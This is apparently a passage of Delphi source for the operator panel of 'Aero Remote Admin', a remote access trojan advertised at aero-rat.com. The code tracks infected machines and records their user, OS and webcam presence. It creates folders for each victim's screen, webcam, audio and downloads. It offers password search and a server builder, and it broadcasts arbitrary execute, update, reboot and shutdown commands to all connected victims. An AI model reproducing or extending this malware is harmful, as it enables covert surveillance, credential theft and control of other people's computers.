procedure TClientForm.ServerSocket1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
  Data: string;
  SocketData: TSocketData;
begin
  if Socket.Data = nil then begin
    SocketData := TSocketData.Create;
    Socket.Data := SocketData
  end;
  SocketData := TSocketData(Socket.Data);

  Data := Socket.ReceiveText;
  if Data = '' then Exit;

  SocketData.Data := SocketData.Data + Data;
  SocketData.ServerData.Wan := Socket.RemoteAddress;

  ParseData(Socket);
end;

procedure TClientForm.DisconnectSocket(SocketData: TSocketData);
var
  NewLi: TListItem;
  Li: TListItem;
  connectionForm: TConnectionForm;
  DisconnectProc: procedure(Socket: TCustomWinSocket);
begin
  if SocketData = nil then exit;

  @DisconnectProc := SocketData.DisconnectProc;
  if @DisconnectProc <> nil then DisconnectProc(SocketData.Socket);

  SocketData.Socket := nil;
  if SocketData.IsMainSocket then SocketData.MainSocket := nil;

  if SocketData.ListItem <> nil then ClientForm.AddData('Lost Connection' + Chr(9) + Chr(9) +  SocketData.ServerData.Group + ' - ' + SocketData.ServerData.Name,clRed);

  if (SocketData.Form <> nil) and (Settings.CheckBox12.Checked) then TForm(SocketData.Form).Close;

  if SocketData.ListItem <> nil then begin
    ConnectionForm := SocketData.ConnectionForm;
    SocketData.ListItem.ImageIndex := 0;
    SocketData.Ping := '-';
    SocketData.Idle := '-';
    SocketData.ListItem.SubItems[10] := '-';
    SocketData.ListItem.SubItems[11] := '-';
    if Settings.CheckBox6.Checked then DoPopup('Lost Connection',SocketData);
    if Settings.CheckBox12.Checked then begin
      SocketData.ListItem.Data := nil;
      SocketData.ListItem.Delete;
      SocketData.ListItem := nil;
    end else begin
      if GroupOnlineContatcs1.Checked then begin
        NewLi := SocketData.ConnectionForm.ListView1.Items.Add;
        NewLi.Assign(SocketData.ListItem);
        NewLi.SubItemImages[1] := SocketData.ListItem.SubItemImages[1];
        NewLi.SubItemImages[8] := SocketData.ListItem.SubItemImages[8];
        SocketData.ListItem.Delete;
        SocketData.ListItem := NewLi;
        SocketData.ConnectionForm.ClickTheColumn;
      end;
    end;
    SocketData.ConnectionForm.UpdateCaption;
  end else begin
    //SocketData.Free;
  end;

end;

procedure TClientForm.ServerSocket1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  DisconnectSocket(Socket.Data);
end;

procedure TClientForm.ServerSocket1ClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0; // don't raise an exception
  DisconnectSocket(Socket.Data);
end;

procedure TClientForm.ApplicationEvents1Exception(Sender: TObject; E: Exception);
begin
  //Application.ProcessMessages;
end;

procedure TClientForm.ToolButton1Click(Sender: TObject);
begin
  if Toolbutton1.Down then begin
    Toolbutton2.Enabled := False;
    Settings.Parent := Self; //Panel2;
    Settings.Align := alClient;
    Settings.BorderStyle := bsNone;
    Settings.Show;
    Settings.BringToFront;
    RichEdit1.Hide;
    Panel2.Visible := False;
    Splitter2.Visible := False;
  end else begin
    Toolbutton2.Enabled := True;
    Settings.Hide;
    Panel2.Visible := ToolButton3.Down;
    Splitter2.Visible := ToolBUtton3.Down;
    if not PageControl1.Visible then RichEdit1.Show;
  end;
end;

procedure TClientForm.InitRichEditURLDetection(RE: TRichEdit);
var
  mask: Word;
begin
  mask := SendMessage(RE.Handle, EM_GETEVENTMASK, 0, 0);
  SendMessage(RE.Handle, EM_SETEVENTMASK, 0, mask or ENM_LINK);
  SendMessage(RE.Handle, EM_AUTOURLDETECT, Integer(True), 0);
end;

procedure TClientForm.FormCreate(Sender: TObject);
var
  Ini: TIniFile;
  State: integer;
begin
  Caption := 'Aero Remote Admin - 0/0 Users Online';
  Application.Title := Caption;


  

  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');
    Width := Ini.ReadInteger('Client','Width',Width);
    Height := Ini.ReadInteger('Client','Height',Height);
    Left := Ini.ReadInteger('Client','Left',Left);
    Top := Ini.ReadInteger('Client','Top',Top);
    GroupOnlineContatcs1.Checked := ini.ReadBool('Client','GroupOnline',GroupOnlineContatcs1.Checked);
  Ini.Free;

  Treeview1.Items[0].Expand(True);
  
  InitRichEditURLDetection(RichEdit1);
  
  RichEdit1.SelStart := RichEdit1.GetTextLen;
  RichEdit1.SelAttributes.Color := clBlack;
  RichEdit1.SelAttributes.Size := 12;
  RichEdit1.SelText := #13#10 + 'Thank you for using Aero Remote Admin' + #13#10;

  RichEdit1.SelStart := RichEdit1.GetTextLen;
  RichEdit1.SelAttributes.Color := clBlack;
  RichEdit1.SelAttributes.Size := 10;
  RichEdit1.SelText :=  'For help & assistance please goto' + #13#10#13#10 + 'www.aero-rat.com' + #13#10 +
  'www.wl-group.net' + #13#10#13#10 +
  'Contact: slhcoder@hotmail.co.uk';

  Strings := TStringList.Create;
  strings.add('ad');
  strings.add('ae');
  strings.add('af');
  strings.add('ag');
  strings.add('ai');
  strings.add('al');
  strings.add('am');
  strings.add('an');
  strings.add('ao');
  strings.add('ar');
  strings.add('as');
  strings.add('at');
  strings.add('au');
  strings.add('aw');
  strings.add('ax');
  strings.add('az');
  strings.add('ba');
  strings.add('bb');
  strings.add('bd');
  strings.add('be');
  strings.add('bf');
  strings.add('bg');
  strings.add('bh');
  strings.add('bi');
  strings.add('bj');
  strings.add('bm');
  strings.add('bn');
  strings.add('bo');
  strings.add('br');
  strings.add('bs');
  strings.add('bt');
  strings.add('bv');
  strings.add('bw');
  strings.add('by');
  strings.add('bz');
  strings.add('ca');
  strings.add('catalonia');
  strings.add('cc');
  strings.add('cd');
  strings.add('cf');
  strings.add('cg');
  strings.add('ch');
  strings.add('ci');
  strings.add('ck');
  strings.add('cl');
  strings.add('cm');
  strings.add('cn');
  strings.add('co');
  strings.add('cr');
  strings.add('cs');
  strings.add('cu');
  strings.add('cv');
  strings.add('cx');
  strings.add('cy');
  strings.add('cz');
  strings.add('de');
  strings.add('dj');
  strings.add('dk');
  strings.add('dm');
  strings.add('do');
  strings.add('dz');
  strings.add('ec');
  strings.add('ee');
  strings.add('eg');
  strings.add('eh');
  strings.add('england');
  strings.add('er');
  strings.add('es');
  strings.add('et');
  strings.add('europeanunion');
  strings.add('fam');
  strings.add('fi');
  strings.add('fj');
  strings.add('fk');
  strings.add('fm');
  strings.add('fo');
  strings.add('fr');
  strings.add('ga');
  strings.add('gb');
  strings.add('gd');
  strings.add('ge');
  strings.add('gf');
  strings.add('gh');
  strings.add('gi');
  strings.add('gl');
  strings.add('gm');
  strings.add('gn');
  strings.add('gp');
  strings.add('gq');
  strings.add('gr');
  strings.add('gs');
  strings.add('gt');
  strings.add('gu');
  strings.add('gw');
  strings.add('gy');
  strings.add('hk');
  strings.add('hm');
  strings.add('hn');
  strings.add('hr');
  strings.add('ht');
  strings.add('hu');
  strings.add('id');
  strings.add('ie');
  strings.add('il');
  strings.add('in');
  strings.add('io');
  strings.add('iq');
  strings.add('ir');
  strings.add('is');
  strings.add('it');
  strings.add('jm');
  strings.add('jo');
  strings.add('jp');
  strings.add('ke');
  strings.add('kg');
  strings.add('kh');
  strings.add('ki');
  strings.add('km');
  strings.add('kn');
  strings.add('kp');
  strings.add('kr');
  strings.add('kw');
  strings.add('ky');
  strings.add('kz');
  strings.add('la');
  strings.add('lb');
  strings.add('lc');
  strings.add('li');
  strings.add('lk');
  strings.add('lr');
  strings.add('ls');
  strings.add('lt');
  strings.add('lu');
  strings.add('lv');
  strings.add('ly');
  strings.add('ma');
  strings.add('mc');
  strings.add('md');
  strings.add('me');
  strings.add('mg');
  strings.add('mh');
  strings.add('mk');
  strings.add('ml');
  strings.add('mm');
  strings.add('mn');
  strings.add('mo');
  strings.add('mp');
  strings.add('mq');
  strings.add('mr');
  strings.add('ms');
  strings.add('mt');
  strings.add('mu');
  strings.add('mv');
  strings.add('mw');
  strings.add('mx');
  strings.add('my');
  strings.add('mz');
  strings.add('na');
  strings.add('nc');
  strings.add('ne');
  strings.add('nf');
  strings.add('ng');
  strings.add('ni');
  strings.add('nl');
  strings.add('no');
  strings.add('np');
  strings.add('nr');
  strings.add('nu');
  strings.add('nz');
  strings.add('om');
  strings.add('pa');
  strings.add('pe');
  strings.add('pf');
  strings.add('pg');
  strings.add('ph');
  strings.add('pk');
  strings.add('pl');
  strings.add('pm');
  strings.add('pn');
  strings.add('pr');
  strings.add('ps');
  strings.add('pt');
  strings.add('pw');
  strings.add('py');
  strings.add('qa');
  strings.add('re');
  strings.add('ro');
  strings.add('rs');
  strings.add('ru');
  strings.add('rw');
  strings.add('sa');
  strings.add('sb');
  strings.add('sc');
  strings.add('scotland');
  strings.add('sd');
  strings.add('se');
  strings.add('sg');
  strings.add('sh');
  strings.add('si');
  strings.add('sj');
  strings.add('sk');
  strings.add('sl');
  strings.add('sm');
  strings.add('sn');
  strings.add('so');
  strings.add('sr');
  strings.add('st');
  strings.add('sv');
  strings.add('sy');
  strings.add('sz');
  strings.add('tc');
  strings.add('td');
  strings.add('tf');
  strings.add('tg');
  strings.add('th');
  strings.add('tj');
  strings.add('tk');
  strings.add('tl');
  strings.add('tm');
  strings.add('tn');
  strings.add('to');
  strings.add('tr');
  strings.add('tt');
  strings.add('tv');
  strings.add('tw');
  strings.add('tz');
  strings.add('ua');
  strings.add('ug');
  strings.add('um');
  strings.add('us');
  strings.add('uy');
  strings.add('uz');
  strings.add('va');
  strings.add('vc');
  strings.add('ve');
  strings.add('vg');
  strings.add('vi');
  strings.add('vn');
  strings.add('vu');
  strings.add('wales');
  strings.add('wf');
  strings.add('ws');
  strings.add('ye');
  strings.add('yt');
  strings.add('za');
  strings.add('zm');
  strings.add('zw');


  //WindowState := wsMaximized;
  {ClientForm.BringToFront;
  AnimateWindow(ClientForm.Handle, 3000, AW_BLEND);
  ClientForm.Show;}

end;

procedure TClientForm.CoolTrayIcon1DblClick(Sender: TObject);
begin

end;

procedure TClientForm.ToolButton2Click(Sender: TObject);
begin
  if Toolbutton2.Down then begin
    Toolbutton1.Enabled := False;
    CreateServer.Parent := Self; //Panel2;
    CreateServer.Align := alClient;
    CreateServer.BorderStyle := bsNone;
    CreateServer.Show;
    CreateServer.BringToFront;
    RichEdit1.Hide;
    Panel2.Visible := False;
    Splitter2.Visible := False;
  end else begin
    Toolbutton1.Enabled := True;
    CreateServer.Hide;
    Panel2.Visible := ToolButton3.Down;
    Splitter2.Visible := ToolBUtton3.Down;
    if not PageCOntrol1.Visible then RichEdit1.Show;
  end;
end;


procedure TClientForm.SearchPasswords1Click(Sender: TObject);
begin
  PasswordSearch.Show;
end;

procedure TClientForm.CoolTrayIcon1BalloonHintShow(Sender: TObject);
begin
  timer1.Enabled := false;
  timer1.Enabled := true;
end;

procedure TClientForm.Seach1Click(Sender: TObject);
begin
  Close;
end;

procedure TClientForm.FormClose(Sender: TObject; var Action: TCloseAction);
var
  i,x: integer;
  ConnectionForm: TConnectionForm;
  SocketData: TSocketData;
  s: string;
  Stream: TMemoryStream;
  Ini: TIniFile;
  Data: string;
begin

  WindowState := wsNormal;

  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');
    Ini.WriteInteger('Client','Column',LastSortedColumn);
    Ini.WriteBool('Client','Sort',Ascending);
    Ini.WriteInteger('Client','Width',Width);
    Ini.WriteInteger('Client','Height',Height);
    Ini.WriteInteger('Client','Left',Left);
    Ini.WriteInteger('Client','Top',Top);
    ini.WriteBool('Client','GroupOnline',GroupOnlineContatcs1.Checked);

    if PageControl1.PageCount > 0 then begin
      ConnectionForm := FindConnectionForm(PageControl1.ActivePage.Caption);
      Ini.WriteInteger('Client','Col0',ConnectionForm.ListView1.Column[0].Width);
      Ini.WriteInteger('Client','Col1',ConnectionForm.ListView1.Column[1].Width);
      Ini.WriteInteger('Client','Col2',ConnectionForm.ListView1.Column[2].Width);
      Ini.WriteInteger('Client','Col3',ConnectionForm.ListView1.Column[3].Width);
      Ini.WriteInteger('Client','Col4',ConnectionForm.ListView1.Column[4].Width);
      Ini.WriteInteger('Client','Col5',ConnectionForm.ListView1.Column[5].Width);
      Ini.WriteInteger('Client','Col6',ConnectionForm.ListView1.Column[6].Width);
      Ini.WriteInteger('Client','Col7',ConnectionForm.ListView1.Column[7].Width);
      Ini.WriteInteger('Client','Col8',ConnectionForm.ListView1.Column[8].Width);
      Ini.WriteInteger('Client','Col9',ConnectionForm.ListView1.Column[9].Width);
      Ini.WriteInteger('Client','Col10',ConnectionForm.ListView1.Column[10].Width);
      Ini.WriteInteger('Client','Col11',ConnectionForm.ListView1.Column[11].Width);
      Ini.WriteInteger('Client','Col12',ConnectionForm.ListView1.Column[12].Width);
    end;
  Ini.Free;


  Stream := TMemoryStream.Create;
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      if SocketData = nil then Continue;
      Stream.Write(SocketData.ServerData,SizeOf(SocketData.ServerData));
    end;
  end;
  SetString(Data,Pchar(Stream.Memory),Stream.Size);
  Data := Compress(nil,Data);
  Stream.Clear;
  Stream.Write(pointer(Data)^,Length(Data));
  try
//    Stream.SaveToFile(Settings.Edit1.Text + 'Users.cache');
  except
  end;
  Stream.Free;

  Settings.Close;
  CreateServer.Close;

  ExitProcess(0);
end;

procedure TClientForm.Help2Click(Sender: TObject);
begin
  ShellExecute(0,'open','http://www.delphisource.freeforums.org','','',SW_SHOWNORMAL);
end;

procedure TClientForm.About1Click(Sender: TObject);
var
  sp: TSplashScreen;
begin
  sp := TSplashScreen.Create(nil);
  sp.ProgressBar1.Hide;
  Sp.ShowModal;
  sp.Free;
end;

procedure TClientForm.LogOff1Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
begin
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      SendData(SocketData.MainSocket,'Logoff');
    end;
  end;
end;

procedure TClientForm.Reboot1Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
begin
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      SendData(SocketData.MainSocket,'Reboot');
    end;
  end;
end;

procedure TClientForm.Shutdown1Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
begin
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      SendData(SocketData.MainSocket,'Shutdown');
    end;
  end;
end;

procedure TClientForm.Close1Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
begin
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      SendData(SocketData.MainSocket,'Close');
    end;
  end;
end;

procedure TClientForm.Share1Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
  i2: integer;
begin
  if ShareServer.ShowModal <> mrOk then exit;
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);

      for i2 := 0 to ShareServer.ListView1.Items.Count -1 do begin
        SendData(SocketData.MainSocket,'Share|' + ShareServer.ListView1.Items[i2].Caption + '|' + ShareServer.ListView1.Items[i2].SubItems[0] + '|' );
      end;
    end;
  end;
end;

procedure TClientForm.Ping1Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
begin
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      SocketData.PingReceived := False;
      SocketData.PingSentAt := GetTickCount;
      SocketData.SentFirstPing := True;
      SendData(SocketData.MainSocket,'Ping');
    end;
  end;
end;

procedure TClientForm.Update1Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
begin
  if not opendialog1.Execute then exit;
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      SendData(SocketData.MainSocket,'NewConnection|UpdateServer|' + OpenDialog1.FileName);
    end;
  end;
end;

procedure TClientForm.ServerSocket1ClientWrite(Sender: TObject;
  Socket: TCustomWinSocket);
begin
end;

procedure TClientForm.GroupOnlineContatcs1Click(Sender: TObject);
var
  i: integer;
begin
  GroupOnlineContatcs1.Checked := not GroupOnlineContatcs1.Checked;
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    TConnectionForm(Screen.Forms[i]).ClickTheColumn2;
  end;
end;

procedure TClientForm.ExportContactList1Click(Sender: TObject);
var
  Stream: TMemoryStream;
  ConnectionForm: TConnectionForm;
  SocketData: TSocketData;
  x,i: integer;
  Data: string;
begin
  if not savedialog1.Execute then exit;
  Stream := TMemoryStream.Create;
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      if SocketData = nil then Continue;
      Stream.Write(SocketData.ServerData,SizeOf(SocketData.ServerData));
    end;
  end;
  SetString(Data,Pchar(Stream.Memory),Stream.Size);
  Data := Compress(nil,Data);
  Stream.Clear;
  Stream.Write(pointer(Data)^,Length(Data));
  try
    Stream.SaveToFile(SaveDialog1.FileName);
  except
  end;
  Stream.Free;
end;

procedure TClientForm.ImportContactList1Click(Sender: TObject);
var
  STream: TMemorySTream;
  Data: string;
  SocketData: TSocketData;
  ConnectionForm: TConnectionForm;
  ServerData: TServerData;
  Li: TListItem;
  i: integer;
begin
  if not opendialog2.Execute then exit;
  Stream := TMemoryStream.Create;
  try
    Stream.LoadFromFile(opendialog2.FileName);
  except
  end;
  Stream.Position := 0;
  SetString(Data,Pchar(Stream.Memory),Stream.Size);
  Data := DeCompress(nil,Data);
  Stream.Clear;
  Stream.Write(pointer(Data)^,Length(Data));
  Stream.Position := 0;
  while Stream.Position < Stream.Size do begin
    Stream.Read(ServerData,SizeOf(ServerData));

    ConnectionForm := FindConnectionForm(ServerData.Group);

    Li := nil;

    for i := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      if (ConnectionForm.ListView1.Items[i].SubItems[3] = ServerData.User) and
      (ConnectionForm.ListView1.Items[i].SubItems[2] = ServerData.Computer) then begin
        Li := ConnectionForm.ListView1.Items[i];
        Break;
      end;
    end;
    if Li <> nil then Continue;

    SocketData := TSocketData.Create;
    SocketData.ServerData := ServerData;
    SocketData.Ping := '-';
    SocketData.Idle := '-';

    Li := ConnectionForm.ListView1.Items.Add;
    Li.Caption := SocketData.ServerData.Name;
    Li.SubItems.Add(SocketData.ServerData.Lan);
    Li.SubItems.Add(SocketData.ServerData.Wan);
    Li.SubItemImages[1] := FlagFromIp(SocketData);
    Li.SubItems.Add(SocketData.ServerData.Computer);
    Li.SubItems.Add(SocketData.ServerData.User);
    Li.SubItems.Add(SocketData.ServerData.Account);
    Li.SubItems.Add(SocketData.ServerData.Os);
    Li.SubItems.Add(SocketData.ServerData.Processor + ' Mhz');
    try
      Li.SubItems.Add(FileSizeToSTr(strtoint64(SocketData.ServerData.Memory)));
    except
      Li.Delete;
      SocketData.Free;
      Continue;
    end;

    Li.SubItems.Add(SocketData.ServerData.Webcam);
    if SocketData.ServerData.Webcam = 'Detected' then Li.SubItemImages[8] := 2 else Li.SubItemImages[8] := 3;
    Li.SubItems.Add(SocketData.ServerData.Version);
    Li.SubItems.Add(SocketData.Ping);
    Li.SubItems.Add(SocketData.Idle);
    Li.Data := SocketData;
    SocketData.ListItem := Li;
    SocketData.ConnectionForm := ConnectionForm;
    Li.ImageIndex := 0;
    if SocketData.ServerData.Special = 'True' then Li.StateIndex := 1 else Li.StateIndex := 0;
    
    SocketData.MainPath := Settings.Edit1.Text + SocketData.ServerData.Computer + '\' + SocketData.ServerData.User + '\';
    SocketData.ScreenPath := SocketData.MainPath + 'Screen\';
    SocketData.WebcamPath := SocketData.MainPath + 'Webcam\';
    SocketData.DownloadPath := SocketData.MainPath + 'Downloads\';
    SocketData.AudioPath := SocketData.MainPath + 'Audio\';
    SocketData.CachePath := SocketData.MainPath + 'Cache\';

    MakeSureDirectoryPathExists(pchar(SocketData.ScreenPath));
    MakeSureDirectoryPathExists(pchar(SocketData.WebcamPath));
    MakeSureDirectoryPathExists(pchar(SocketData.DownloadPath));
    MakeSureDirectoryPathExists(pchar(SocketData.AudioPath));
    MakeSureDirectoryPathExists(pchar(SocketData.CachePath));

    SocketData.ConnectionForm := ConnectionForm;
    ConnectionForm.UpdateCaption;

  end;

  Stream.Free;
  ClientForm.PageControl1.Visible := (ClientForm.PageControl1.PageCount > 0);
  ClientForm.PageControl1.BringToFront;

end;

procedure TClientForm.Button1Click(Sender: TObject);
begin
  if ScreenTotal > 0 then begin
    PageControl1.Show;
    PageControl1.BringToFront;
    RichEdit1.Hide;
  end else begin
    Panel1.Show;
    Panel1.BringToFront;
  end;
  Button1.Hide;
end;

procedure TClientForm.FormCanResize(Sender: TObject; var NewWidth,
  NewHeight: Integer; var Resize: Boolean);
begin
  Button1.Left := (Width div 2) - (Button1.Width div 2);
  Button1.Top := (Height div 2) - (Button1.Height div 2);
end;

procedure TClientForm.FormCloseQuery(Sender: TObject;
  var CanClose: Boolean);
begin
  Hide;
end;

procedure TClientForm.Execute1Click(Sender: TObject);
var
  i,x: integer;
  p: string;
  SocketData: TSocketData;
  ConnectionFOrm: TCOnnectionForm;
begin
  p := inputbox('Execute','Enter Command To Execute','');
  if p = '' then exit;

  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      SendData(SocketData.MainSocket,'Execute|' + p);
    end;
  end;
end;

procedure TClientForm.Timer3Timer(Sender: TObject);
begin
  CPS := 0;
end;

procedure TClientForm.AddData(Text: string; Colour: TColor);
begin
  RichEdit2.SelStart := RichEdit2.GetTextLen;
  RichEdit2.SelAttributes.Color := Colour;
  RichEdit2.SelText := DateTimeToStr(Now) + Chr(9) + Text + #13#10;
end;

procedure TClientForm.ToolButton3Click(Sender: TObject);
begin
  Panel2.Visible := ToolButton3.Down;
  Splitter2.Visible := ToolBUtton3.Down;
end;

end.
